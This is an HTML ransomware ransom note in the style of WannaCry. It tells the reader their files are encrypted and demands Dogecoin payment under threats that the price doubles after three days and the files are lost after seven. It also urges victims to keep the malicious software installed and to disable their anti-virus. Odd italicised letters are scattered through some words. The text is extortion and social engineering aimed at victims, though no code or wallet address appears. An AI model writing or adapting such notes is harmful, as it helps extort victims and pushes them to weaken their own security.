	<h2>Ooops, your files have been encrypted!</h2>

	<h3>What Happened to Your Computer</h3>
	<p>
Your important files are
encrypted. Many of your
documents, photos, videos
and other files are no
longer accessible because
they have been
encrypted. You can
verify this by trying
to open
them. Maybe you
are looking
for a way to
recover your files, but
do not
waste your time. Nobody can
recover your files
without our decryption service.
	</p>

	<h3>How to Recover Your Files</h3>
	<p>
We guarantee that
you can recover all your
files safely
and easily. But you need
to pay,
and you
only have 3
days to submit
the payment. After that the
price will be doubled.
Also, if you don't
pay in 7 days, you
won't be
able to
recover your files forever.
	</p>

	<h3>How Do You Pay</h3>
	<p>
Payment is accepted in
Dogecoin only.
Please check the
current price and buy
some Dogecoins, then send the
correct amount
to the address specified below.

	<p>After your payment, contact us to check payment. Be<i>s</i>t time to check: 9:00am - 11:00am CST from Friday to Sunday.
Once the payment is checked, you can start decry<i>p</i>ting your files immediately.

	<p>We strongly re<i>c</i>ommend you to not remove the software, and disable your anti-virus for a while, until you pay and the paym<i>e</i>nt gets processed.
If your anti-virus gets updated and remove<i>s</i> the software automatically, it will not be able to recover your files even if you pay!</p>
